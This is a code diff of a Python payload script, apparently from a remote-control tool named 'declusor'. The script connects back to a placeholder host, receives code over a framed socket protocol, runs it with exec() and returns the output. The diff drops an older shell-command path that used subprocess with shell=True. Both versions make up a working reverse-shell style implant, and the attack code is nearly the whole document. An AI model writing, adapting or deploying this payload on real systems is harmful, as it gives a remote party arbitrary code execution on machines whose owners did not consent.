@@ -4,7 +4,6 @@
 import io
 import socket
 import struct
-import subprocess
 import sys
 
 HOST = "$DECLUSOR_HOST"
@@ -43,98 +42,30 @@ def _send_frame(sock: socket.socket, channel: int, data: bytes) -> None:
     sock.sendall(struct.pack(">BI", channel, len(data)) + data)
 
 
-def _is_python(code: str) -> bool:
-    stripped = code.strip()
-
-    if not stripped:
-        return True
-
-    if stripped.startswith("#!"):
-        first_line = stripped.splitlines()[0].lower()
-        return "python" in first_line
-
-    if any(stripped.startswith(fn + "(") for fn in SESSION_SCOPE):
-        return True
-
-    in_docstring = False
-    doc_delim = ""
-    keywords = (
-        "import ",
-        "from ",
-        "def ",
-        "class ",
-        "async ",
-        "with ",
-        "try:",
-        "print(",
-        "exec(",
-        "eval(",
-        "sys.",
-        "os.",
-    )
-
-    for raw_line in stripped.splitlines():
-        line = raw_line.strip()
-
-        if not line:
-            continue
-
-        if in_docstring:
-            if doc_delim in line:
-                in_docstring = False
-            continue
-
-        if line.startswith(('"""', "'''")):
-            doc_delim = line[:3]
-            if line.count(doc_delim) < 2:
-                in_docstring = True
-            continue
-
-        if line.startswith("#"):
-            continue
-
-        return any(line.startswith(kw) for kw in keywords)
-
-    return False
-
-
 def _execute(payload: str, sock: socket.socket) -> None:
-    if _is_python(payload):
-        buf = io.StringIO()
-        old_out, old_err = sys.stdout, sys.stderr
+    buf = io.StringIO()
+    old_out, old_err = sys.stdout, sys.stderr
 
-        try:
-            sys.stdout = sys.stderr = buf
-            exec(payload, SESSION_SCOPE)
-        except (Exception, SystemExit) as exc:
-            buf.write(f"[py_socket error] {type(exc).__name__}: {exc}\n")
-        finally:
-            sys.stdout, sys.stderr = old_out, old_err
+    try:
+        sys.stdout = sys.stderr = buf
+        exec(payload, SESSION_SCOPE)  # noqa: S102
+    except (Exception, SystemExit) as exc:
+        buf.write(f"[py_socket error] {type(exc).__name__}: {exc}\n")
+    finally:
+        sys.stdout, sys.stderr = old_out, old_err
 
-        output = buf.getvalue().encode(errors="replace")
+    output = buf.getvalue().encode(errors="replace")
 
-        if output:
-            _send_frame(sock, 1, output)
+    if output:
+        _send_frame(sock, 1, output)
 
-        _send_frame(sock, 0, b"")
-    else:
-        proc = subprocess.Popen(payload, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)  # noqa: S602
-
-        while proc.stdout:
-            chunk = proc.stdout.read(4096)
-
-            if not chunk:
-                break
-
-            _send_frame(sock, 1, chunk)
-
-        proc.wait()
-
-        _send_frame(sock, 0, b"")
+    _send_frame(sock, 0, b"")
 
 
 def main() -> None:
     with socket.create_connection((HOST, PORT)) as sock:
+        SESSION_SCOPE["_send_frame"] = lambda ch, data: _send_frame(sock, ch, data)
+
         helpers_bytes = _read_frame(sock)
 
         if helpers_bytes:
